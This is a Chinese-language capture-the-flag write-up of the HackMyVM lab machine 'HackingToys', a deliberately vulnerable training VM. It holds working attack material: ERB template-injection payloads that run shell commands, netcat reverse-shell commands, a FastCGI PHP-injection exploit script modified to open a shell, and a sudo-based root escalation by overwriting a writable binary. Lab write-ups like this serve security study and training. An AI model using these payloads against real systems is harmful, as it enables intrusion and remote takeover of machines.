---
title: HackingToys
author: hgbe02
date: 2024-09-07 11:54:38 +0800
categories: [Training platform,Hackmyvm]  
tags: [Hackmyvm,web]  
permalink: "/Hackmyvm/HackingToys.html"
---

# HackingToys

<img src="https://pic-for-be.oss-cn-hangzhou.aliyuncs.com/img/202409071157954.png" alt="image-20240904145612665" style="zoom: 50%;" />

<img src="https://pic-for-be.oss-cn-hangzhou.aliyuncs.com/img/202409071157956.png" alt="image-20240904151523172" style="zoom:50%;" />

## 信息搜集

### 端口扫描

```bash
┌──(kali💀kali)-[~/temp/HackingToys]
└─$ rustscan -a $IP -- -sCV
.----. .-. .-. .----..---.  .----. .---.   .--.  .-. .-.
| {}  }| { } |{ {__ {_   _}{ {__  /  ___} / {} \ |  `| |
| .-. \| {_} |.-._} } | |  .-._} }\     }/  /\  \| |\  |
`-' `-'`-----'`----'  `-'  `----'  `---' `-'  `-'`-' `-'
The Modern Day Port Scanner.
________________________________________
: https://discord.gg/GFrQsGy           :
: https://github.com/RustScan/RustScan :
 --------------------------------------
Please contribute more quotes to our GitHub https://github.com/rustscan/rustscan

[~] The config file is expected to be at "/home/kali/.rustscan.toml"
[!] File limit is lower than default batch size. Consider upping with --ulimit. May cause harm to sensitive servers
[!] Your file limit is very small, which negatively impacts RustScan's speed. Use the Docker image, or up the Ulimit with '--ulimit 5000'. 
Open 192.168.10.103:22
Open 192.168.10.103:3000
PORT     STATE SERVICE  REASON  VERSION
22/tcp   open  ssh      syn-ack OpenSSH 9.2p1 Debian 2+deb12u2 (protocol 2.0)
| ssh-hostkey: 
|   256 e7:ce:f2:f6:5d:a7:47:5a:16:2f:90:07:07:33:4e:a9 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBLuHH80SwA8Qff3pGOY4aBesL0Aeesw6jqX+pbtR9O7w8jlbyNhuHmjjABb/34BxFp2oBx8o5xuZVXS1cE9nAlE=
|   256 09:db:b7:e8:ee:d4:52:b8:49:c3:cc:29:a5:6e:07:35 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAICKFE9s2IvPGAJ7Pt0kSC8t9OXYUrueJQQplSC2wbYtY
3000/tcp open  ssl/ppp? syn-ack
| ssl-cert: Subject: organizationName=Internet Widgits Pty Ltd/stateOrProvinceName=Some-State/countryName=FR
| Issuer: organizationName=Internet Widgits Pty Ltd/stateOrProvinceName=Some-State/countryName=FR
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2024-05-20T15:36:20
| Not valid after:  2038-01-27T15:36:20
| MD5:   6ac6:1f8b:e3f8:dce0:4b1a:d12b:1259:386d
| SHA-1: c423:6072:834f:77b9:396c:6907:8e29:08d6:f8c7:631d
| -----BEGIN CERTIFICATE-----
| MIIDazCCAlOgAwIBAgIUCWBIwc7YlGcff/jPNV14n8rQolswDQYJKoZIhvcNAQEL
| BQAwRTELMAkGA1UEBhMCRlIxEzARBgNVBAgMClNvbWUtU3RhdGUxITAfBgNVBAoM
| GEludGVybmV0IFdpZGdpdHMgUHR5IEx0ZDAeFw0yNDA1MjAxNTM2MjBaFw0zODAx
| MjcxNTM2MjBaMEUxCzAJBgNVBAYTAkZSMRMwEQYDVQQIDApTb21lLVN0YXRlMSEw
| HwYDVQQKDBhJbnRlcm5ldCBXaWRnaXRzIFB0eSBMdGQwggEiMA0GCSqGSIb3DQEB
| AQUAA4IBDwAwggEKAoIBAQDbdGcclY6p5qgtAzPYwsGWj0LANe7g0b6MSQQkFY6Y
| v9+8UGSOLIU09PFxeeNTdwmMICq3q2bpAc6Qv3Ixuigyv0tqB2DjNMWLemkLvOVd
| nctKDqfSFo3SjjJmW8e7rTWq/C4cu6JjR+ME8Ikd0hAqVRFzh0xfzOfWx1dDyN4S
| ePgBlzV+nGWLXKwsZ2u266JKsVK4/nkpGPT4SPSYE0w5G8xVMhpfqpu2juBPJyRV
| fbzap1YCn+QWSnD6ku0ZQ0YXwAfyPiOSilFQJe4/ZIYBgjJZH6w+DbBRLghDVgJ5
| 5afmOjXZQA0TdQPfF2pUlAf7H07QoHhcTXgiNL82bKB9AgMBAAGjUzBRMB0GA1Ud
| DgQWBBShpGMQrHmIzxxDoytRa/d9GMFfJTAfBgNVHSMEGDAWgBShpGMQrHmIzxxD
| oytRa/d9GMFfJTAPBgNVHRMBAf8EBTADAQH/MA0GCSqGSIb3DQEBCwUAA4IBAQBa
| nEYqR+Z0ybI+C6dD9bOSZMrEHzzRvoIXw2Pgqj4DMVdx2ZEpoMvvn36xeV8JQmrk
| obYrcyBdkUWhdpjMWK6fXtKQ4Dp/O6D0RLdER8FYZCI0r/yy5GCeeDloKiexHDq9
| kuJ6lPoBFDIEK++h9eEvhVw2frL6f+ZBD486klmPhRi8hsxnE4O+olCpCjMLCzfM
| E4l711CWj0pDTMeOfdxps1WaNsDIx/tOqsERNqjIfcgmrPKsFTFtS/sofcCdJ7lq
| RXHpfM1vyRVHEmjNax4qePvpQAgdDcem87KLdDKzFAx/FLTOrn3MLOj8d7XnjJZR
| vozWyeMFGA20aSOApTH3
|_-----END CERTIFICATE-----
|_ssl-date: TLS randomness does not represent time
| fingerprint-strings: 
|   GenericLines: 
|     HTTP/1.0 400 Bad Request
|     Content-Length: 930
|     Puma caught this error: Invalid HTTP format, parsing fails. Are you trying to open an SSL connection to a non-SSL Puma? (Puma::HttpParserError)
|     /usr/local/rvm/gems/ruby-3.1.0/gems/puma-6.4.2/lib/puma/client.rb:268:in `execute'
|     /usr/local/rvm/gems/ruby-3.1.0/gems/puma-6.4.2/lib/puma/client.rb:268:in `try_to_finish'
|     /usr/local/rvm/gems/ruby-3.1.0/gems/puma-6.4.2/lib/puma/server.rb:298:in `reactor_wakeup'
|     /usr/local/rvm/gems/ruby-3.1.0/gems/puma-6.4.2/lib/puma/server.rb:248:in `block in run'
|     /usr/local/rvm/gems/ruby-3.1.0/gems/puma-6.4.2/lib/puma/reactor.rb:119:in `wakeup!'
|     /usr/local/rvm/gems/ruby-3.1.0/gems/puma-6.4.2/lib/puma/reactor.rb:76:in `block in select_loop'
|     /usr/local/rvm/gems/ruby-3.1.0/gems/puma-6.4.2/lib/puma/reactor.rb:76:in `select'
|     /usr/local/rvm/gems/ruby-3.1.0/gems/puma-6.4.2/lib/puma/reactor.rb:76:in `select_loop'
|     /usr/loc
|   GetRequest: 
|     HTTP/1.0 403 Forbidden
|     content-type: text/html; charset=UTF-8
|     Content-Length: 5702
|     <!DOCTYPE html>
|     <html lang="en">
|     <head>
|     <meta charset="utf-8" />
|     <meta name="viewport" content="width=device-width, initial-scale=1">
|     <meta name="turbo-visit-control" content="reload">
|     <title>Action Controller: Exception caught</title>
|     <style>
|     body {
|     background-color: #FAFAFA;
|     color: #333;
|     color-scheme: light dark;
|     supported-color-schemes: light dark;
|     margin: 0px;
|     body, p, ol, ul, td {
|     font-family: helvetica, verdana, arial, sans-serif;
|     font-size: 13px;
|     line-height: 18px;
|     font-size: 11px;
|     white-space: pre-wrap;
|     pre.box {
|     border: 1px solid #EEE;
|     padding: 10px;
|     margin: 0px;
|     width: 958px;
|     header {
|     color: #F0F0F0;
|     background: #C00;
|_    padding:
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port3000-TCP:V=7.94SVN%T=SSL%I=7%D=9/4%Time=66D80951%P=x86_64-pc-linux-
SF:gnu%r(GenericLines,3EF,"HTTP/1\.0\x20400\x20Bad\x20Request\r\nContent-L
SF:ength:\x20930\r\n\r\nPuma\x20caught\x20this\x20error:\x20Invalid\x20HTT
SF:P\x20format,\x20parsing\x20fails\.\x20Are\x20you\x20trying\x20to\x20ope
SF:n\x20an\x20SSL\x20connection\x20to\x20a\x20non-SSL\x20Puma\?\x20\(Puma:
SF::HttpParserError\)\n/usr/local/rvm/gems/ruby-3\.1\.0/gems/puma-6\.4\.2/
SF:lib/puma/client\.rb:268:in\x20`execute'\n/usr/local/rvm/gems/ruby-3\.1\
SF:.0/gems/puma-6\.4\.2/lib/puma/client\.rb:268:in\x20`try_to_finish'\n/us
SF:r/local/rvm/gems/ruby-3\.1\.0/gems/puma-6\.4\.2/lib/puma/server\.rb:298
SF::in\x20`reactor_wakeup'\n/usr/local/rvm/gems/ruby-3\.1\.0/gems/puma-6\.
SF:4\.2/lib/puma/server\.rb:248:in\x20`block\x20in\x20run'\n/usr/local/rvm
SF:/gems/ruby-3\.1\.0/gems/puma-6\.4\.2/lib/puma/reactor\.rb:119:in\x20`wa
SF:keup!'\n/usr/local/rvm/gems/ruby-3\.1\.0/gems/puma-6\.4\.2/lib/puma/rea
SF:ctor\.rb:76:in\x20`block\x20in\x20select_loop'\n/usr/local/rvm/gems/rub
SF:y-3\.1\.0/gems/puma-6\.4\.2/lib/puma/reactor\.rb:76:in\x20`select'\n/us
SF:r/local/rvm/gems/ruby-3\.1\.0/gems/puma-6\.4\.2/lib/puma/reactor\.rb:76
SF::in\x20`select_loop'\n/usr/loc")%r(GetRequest,169E,"HTTP/1\.0\x20403\x2
SF:0Forbidden\r\ncontent-type:\x20text/html;\x20charset=UTF-8\r\nContent-L
SF:ength:\x205702\r\n\r\n<!DOCTYPE\x20html>\n<html\x20lang=\"en\">\n<head>
SF:\n\x20\x20<meta\x20charset=\"utf-8\"\x20/>\n\x20\x20<meta\x20name=\"vie
SF:wport\"\x20content=\"width=device-width,\x20initial-scale=1\">\n\x20\x2
SF:0<meta\x20name=\"turbo-visit-control\"\x20content=\"reload\">\n\x20\x20
SF:<title>Action\x20Controller:\x20Exception\x20caught</title>\n\x20\x20<s
SF:tyle>\n\x20\x20\x20\x20body\x20{\n\x20\x20\x20\x20\x20\x20background-co
SF:lor:\x20#FAFAFA;\n\x20\x20\x20\x20\x20\x20color:\x20#333;\n\x20\x20\x20
SF:\x20\x20\x20color-scheme:\x20light\x20dark;\n\x20\x20\x20\x20\x20\x20su
SF:pported-color-schemes:\x20light\x20dark;\n\x20\x20\x20\x20\x20\x20margi
SF:n:\x200px;\n\x20\x20\x20\x20}\n\n\x20\x20\x20\x20body,\x20p,\x20ol,\x20
SF:ul,\x20td\x20{\n\x20\x20\x20\x20\x20\x20font-family:\x20helvetica,\x20v
SF:erdana,\x20arial,\x20sans-serif;\n\x20\x20\x20\x20\x20\x20font-size:\x2
SF:0\x20\x2013px;\n\x20\x20\x20\x20\x20\x20line-height:\x2018px;\n\x20\x20
SF:\x20\x20}\n\n\x20\x20\x20\x20pre\x20{\n\x20\x20\x20\x20\x20\x20font-siz
SF:e:\x2011px;\n\x20\x20\x20\x20\x20\x20white-space:\x20pre-wrap;\n\x20\x2
SF:0\x20\x20}\n\n\x20\x20\x20\x20pre\.box\x20{\n\x20\x20\x20\x20\x20\x20bo
SF:rder:\x201px\x20solid\x20#EEE;\n\x20\x20\x20\x20\x20\x20padding:\x2010p
SF:x;\n\x20\x20\x20\x20\x20\x20margin:\x200px;\n\x20\x20\x20\x20\x20\x20wi
SF:dth:\x20958px;\n\x20\x20\x20\x20}\n\n\x20\x20\x20\x20header\x20{\n\x20\
SF:x20\x20\x20\x20\x20color:\x20#F0F0F0;\n\x20\x20\x20\x20\x20\x20backgrou
SF:nd:\x20#C00;\n\x20\x20\x20\x20\x20\x20padding:");
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

顺便扫一下udp端口：

```bash
┌──(kali💀kali)-[~/temp/HackingToys]
└─$ sudo nmap -sU -sT -T4 --top-ports 100 $IP              
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-09-04 03:26 EDT
Warning: 192.168.10.103 giving up on port because retransmission cap hit (6).
Stats: 0:01:07 elapsed; 0 hosts completed (1 up), 1 undergoing UDP Scan
UDP Scan Timing: About 85.71% done; ETC: 03:28 (0:00:08 remaining)
Nmap scan report for 192.168.10.103
Host is up (0.0029s latency).
Not shown: 98 closed tcp ports (conn-refused), 82 closed udp ports (port-unreach)
PORT      STATE         SERVICE
22/tcp    open          ssh
3000/tcp  open          ppp
68/udp    open|filtered dhcpc
88/udp    open|filtered kerberos-sec
120/udp   open|filtered cfdptkt
135/udp   open|filtered msrpc
158/udp   open|filtered pcmail-srv
500/udp   open|filtered isakmp
518/udp   open|filtered ntalk
996/udp   open|filtered vsinet
1025/udp  open|filtered blackjack
1028/udp  open|filtered ms-lsa
1813/udp  open|filtered radacct
2000/udp  open|filtered cisco-sccp
2049/udp  open|filtered nfs
2223/udp  open|filtered rockwell-csp2
5060/udp  open|filtered sip
33281/udp open|filtered unknown
49156/udp open|filtered unknown
49185/udp open|filtered unknown
MAC Address: 08:00:27:35:CF:CE (Oracle VirtualBox virtual NIC)

Nmap done: 1 IP address (1 host up) scanned in 99.85 seconds
```

## 漏洞发现

### 踩点

<img src="https://pic-for-be.oss-cn-hangzhou.aliyuncs.com/img/202409071157957.png" alt="image-20240907101049597" style="zoom:33%;" />

```bash
https://192.168.10.101:3000/products/show/1
https://192.168.10.101:3000/products/show/2
https://192.168.10.101:3000/products/show/3
https://192.168.10.101:3000/products/show/4
https://192.168.10.101:3000/products/show/5
https://192.168.10.101:3000/search?query=aaaaa&message=Product+does+not+exist
```

五种近源渗透工具，还有一个搜索框。

<img src="https://pic-for-be.oss-cn-hangzhou.aliyuncs.com/img/202409071157958.png" alt="image-20240907101347822" style="zoom:33%;" />

疑似存在xss注入漏洞，随便输入目录会出现：

<img src="https://pic-for-be.oss-cn-hangzhou.aliyuncs.com/img/202409071157959.png" alt="image-20240907101743045" style="zoom:50%;" />

<img src="https://pic-for-be.oss-cn-hangzhou.aliyuncs.com/img/202409071157960.png" alt="image-20240907101804627" style="zoom:50%;" />

是一个`ruby`的相关网页。

<img src="https://pic-for-be.oss-cn-hangzhou.aliyuncs.com/img/202409071157961.png" alt="image-20240907103018432" style="zoom:33%;" />

### XSS+SSTI(ERB)

尝试一下是否可以执行相关xss命令：https://book.hacktricks.xyz/pentesting-web/xss-cross-site-scripting#injecting-inside-raw-html

<img src="https://pic-for-be.oss-cn-hangzhou.aliyuncs.com/img/202409071157962.png" alt="image-20240907102029428" style="zoom:50%;" />

可以执行相关命令，尝试模板注入：

https://book.hacktricks.xyz/pentesting-web/ssti-server-side-template-injection#erb-ruby

```text
<%= 7*7 %>
%3C%25%3D%207%2A7%20%25%3E
```

<img src="https://pic-for-be.oss-cn-hangzhou.aliyuncs.com/img/202409071157963.png" alt="image-20240907103559313" style="zoom:50%;" />

发现执行成功！

```text
<%= system("whoami") %>
%3C%25%3D%20system%28%22whoami%22%29%20%25%3E
true

<%= system('cat /etc/passwd') %>
%3C%25%3D%20system%28%27cat%20%2Fetc%2Fpasswd%27%29%20%25%3E
true
```

发现只能执行得到true结果，似乎标志着执行成功？尝试反弹shell：

```bash
<%= system('nc -e /bin/bash 192.168.10.102 1234') %>
%3C%25%3D%20system%28%27nc%20%2De%20%2Fbin%2Fbash%20192%2E168%2E10%2E102%201234%27%29%20%25%3E
```

<img src="https://pic-for-be.oss-cn-hangzhou.aliyuncs.com/img/202409071157964.png" alt="image-20240907104304272" style="zoom:50%;" />

### 其他办法

听tao神说似乎可以工具一把梭，尝试一下：

```bash
┌──(kali💀kali)-[~/temp/HackingToys]
└─$ tinja url -u "https://192.168.10.101:3000/search?query=121&message=Product+does+not+exist"                   
TInjA v1.1.3 started at 2024-09-06_22-50-34

Analyzing URL(1/1): https://192.168.10.101:3000/search?query=121&message=Product+does+not+exist
===============================================================
Status code 200
Analyzing query parameter  message  =>  [Product does not exist]
[*] Value  O4MQGSCJNBYDUYO4  of query parameter  message  is being reflected 1 time(s) in the response body

[!] The polyglot <%'${{/#{@}}%>{{ triggered an error: Status Code 500
[*] The polyglot p ">[[${{1}}]] returned the response(s) [unmodified]
[!] The polyglot <%=1%>@*#{1} was rendered in a modified way: [1@*#{1}]
[*] The polyglot <%=1%>@*#{1} returned the response(s) [1@*#{1}]
[*] The polyglot {##}/*{{.}}*/ returned the response(s) [unmodified]

A template injection was detected and the template engine is now being identified.
[*] The polyglot <% returned the response(s) [empty]
[+] A template engine was detected, but could not be identified (certainty: Low)

Analyzing query parameter  query  =>  [121]
No errors are thrown and input is not being reflected.
No template engine could be detected

===============================================================

Successfully finished the scan
[+] Suspected template injections: 1
[+] 0 Very High, 0 High, 0 Medium, 1 Low, 0 Very Low certainty

Duration: 634.186726ms
Average polyglots sent per user input: 3
```

看上去不太阔以哦，换一个工具：

```bash
# cd /
# git clone https://github.com/vladko312/SSTImap.git
# cd SSTImap
# pip install -r requirements.txt --no-warn-script-location
# sudo ln -s /home/kali/SSTImap/sstimap.py /usr/sbin/sstimap
sstimap -u "https://192.168.10.101:3000/search?query=aaaaa&message=Product+does+not+exist"
```

<img src="https://pic-for-be.oss-cn-hangzhou.aliyuncs.com/img/202409071157965.png" alt="image-20240907110119451" style="zoom:50%;" />

```bash
sstimap -u "https://192.168.10.101:3000/search?query=aaaaa&message=Product+does+not+exist" --os-shell
```

<img src="https://pic-for-be.oss-cn-hangzhou.aliyuncs.com/img/202409071157966.png" alt="image-20240907110341400" style="zoom:50%;" />

## 提权

### 信息搜集

```bash
(remote) lidia@hacktoys:/home/lidia/.local$ cat start_rails.sh 
#!/bin/bash

source /etc/profile.d/rvm.sh
cd /opt/app/gadgets/
rake db:drop
rake db:create
rake db:migrate
rails db:seed
exec /usr/local/rvm/gems/ruby-3.1.0/bin/rails server -b 'ssl://0.0.0.0:3000?key=/opt/app/gadgets/certs/server.key&cert=/opt/app/gadgets/certs/server.crt'

(remote) lidia@hacktoys:/home/lidia/.local$ ls -la /usr/local/rvm/gems/ruby-3.1.0/bin/rails
-rwxrwxr-x 1 root rvm 566 May 20 13:51 /usr/local/rvm/gems/ruby-3.1.0/bin/rails
(remote) lidia@hacktoys:/home/lidia/.local$ find / -perm -u=s -type f 2>/dev/null
/usr/bin/passwd
/usr/bin/su
/usr/bin/chsh
/usr/bin/chfn
/usr/bin/gpasswd
/usr/bin/umount
/usr/bin/sudo
/usr/bin/newgrp
/usr/bin/mount
/usr/lib/openssh/ssh-keysign
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
(remote) lidia@hacktoys:/home/lidia/.local$ /usr/sbin/getcap -r / 2>/dev/null
/usr/bin/ping cap_net_raw=ep
(remote) lidia@hacktoys:/home/lidia/.local$ ss -tnlup
Netid           State            Recv-Q           Send-Q                       Local Address:Port                       Peer Address:Port           Process                                  
udp             UNCONN           0                0                                  0.0.0.0:68                              0.0.0.0:*                                                       
tcp             LISTEN           0                511                              127.0.0.1:80                              0.0.0.0:*                                                       
tcp             LISTEN           0                1024                               0.0.0.0:3000                            0.0.0.0:*               users:(("ruby",pid=506,fd=7))           
tcp             LISTEN           0                128                                0.0.0.0:22                              0.0.0.0:*                                                       
tcp             LISTEN           0                4096                             127.0.0.1:9000                            0.0.0.0:*                                                       
tcp             LISTEN           0                128                                   [::]:22                                 [::]:*
```

### 9000 端口

转发一下80端口：

```bash
(remote) lidia@hacktoys:/tmp$ ./socat TCP-LISTEN:8080,fork TCP4:127.0.0.1:80&
[1] 1314
(remote) lidia@hacktoys:/tmp$ ./socat TCP-LISTEN:9001,fork TCP4:127.0.0.1:9000&
[2] 1318
```

<img src="https://pic-for-be.oss-cn-hangzhou.aliyuncs.com/img/202409071157967.png" alt="image-20240907112800925" style="zoom:50%;" />

访问一下：

<img src="https://pic-for-be.oss-cn-hangzhou.aliyuncs.com/img/202409071157968.png" alt="image-20240907112826617" style="zoom:50%;" />

尝试测试：参考 https://book.hacktricks.xyz/network-services-pentesting/9000-pentesting-fastcgi 

```bash
#!/bin/bash

PAYLOAD="<?php echo '<!--'; system('whoami'); echo '-->';"
FILENAMES="/var/www/html/index.php" # Exisiting file path

HOST=$1
B64=$(echo "$PAYLOAD"|base64)

for FN in $FILENAMES; do
    OUTPUT=$(mktemp)
    env -i \
      PHP_VALUE="allow_url_include=1"$'\n'"allow_url_fopen=1"$'\n'"auto_prepend_file='data://text/plain\;base64,$B64'" \
      SCRIPT_FILENAME=$FN SCRIPT_NAME=$FN REQUEST_METHOD=POST \
      cgi-fcgi -bind -connect $HOST:9001 &> $OUTPUT

    cat $OUTPUT
done
```

尝试修改指令，看看能不能执行：

```bash
# 命令改为 id
┌──(kali💀kali)-[~/temp/HackingToys]
└─$ ./exp.sh 192.168.10.101
Content-type: text/html; charset=UTF-8

<!--dodi
uid=1001(dodi) gid=1001(dodi) groups=1001(dodi),100(users)
-->
..........
```

发现是可以的，尝试反弹shell！

```bash
┌──(kali💀kali)-[~/temp/HackingToys]
└─$ head -n 10 exp.sh                                                               
#!/bin/bash

PAYLOAD="<?php echo '<!--'; system('nc -e /bin/bash 192.168.10.102 2345'); echo '-->';"
FILENAMES="/var/www/html/index.php" # Exisiting file path

HOST=$1
B64=$(echo "$PAYLOAD"|base64)

for FN in $FILENAMES; do
    OUTPUT=$(mktemp)
```

<img src="https://pic-for-be.oss-cn-hangzhou.aliyuncs.com/img/202409071157969.png" alt="image-20240907114102351" style="zoom:50%;" />

### 提权 root

```bash
(remote) dodi@hacktoys:/home/dodi$ sudo -l
Matching Defaults entries for dodi on hacktoys:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin, use_pty

User dodi may run the following commands on hacktoys:
    (ALL : ALL) NOPASSWD: /usr/local/bin/rvm_rails.sh
(remote) dodi@hacktoys:/home/dodi$ cat /usr/local/bin/rvm_rails.sh
#!/bin/bash
export rvm_prefix=/usr/local
export MY_RUBY_HOME=/usr/local/rvm/rubies/ruby-3.1.0
export RUBY_VERSION=ruby-3.1.0
export rvm_version=1.29.12
export rvm_bin_path=/usr/local/rvm/bin
export GEM_PATH=/usr/local/rvm/gems/ruby-3.1.0:/usr/local/rvm/gems/ruby-3.1.0@global
export GEM_HOME=/usr/local/rvm/gems/ruby-3.1.0
export PATH=/usr/local/rvm/gems/ruby-3.1.0/bin:/usr/local/rvm/gems/ruby-3.1.0@global/bin:/usr/local/rvm/rubies/ruby-3.1.0/bin:/usr/local/bin:/usr/bin:/bin:/usr/local/games:/usr/games:/usr/local/rvm/bin
export IRBRC=/usr/local/rvm/rubies/ruby-3.1.0/.irbrc
export rvm_path=/usr/local/rvm
exec /usr/local/rvm/gems/ruby-3.1.0/bin/rails "$@"
(remote) dodi@hacktoys:/home/dodi$ ls -la /usr/local/rvm/gems/ruby-3.1.0/bin/rails
-rwxrwxr-x 1 root rvm 566 May 20 13:51 /usr/local/rvm/gems/ruby-3.1.0/bin/rails
(remote) dodi@hacktoys:/home/dodi$ cat /etc/group | grep rvm
rvm:x:1002:lidia,root
```

发现前面一个用户可以修改执行文件，尝试修改进行执行shell：https://gtfobins.github.io/gtfobins/ruby/#shell

```bash
(remote) lidia@hacktoys:/opt/app/gadgets$ echo '/bin/bash' > /usr/local/rvm/gems/ruby-3.1.0/bin/rails
```

尝试执行：

<img src="https://pic-for-be.oss-cn-hangzhou.aliyuncs.com/img/202409071157970.png" alt="image-20240907115435867" style="zoom:50%;" />

得到root。

## 参考

https://www.youtube.com/watch?v=TpriR9yuJKU

https://www.bilibili.com/video/BV1nzHdegEfh/?spm_id_from=333.999.0.0&vd_source=8981ead94b755f367ac539f6ccd37f77

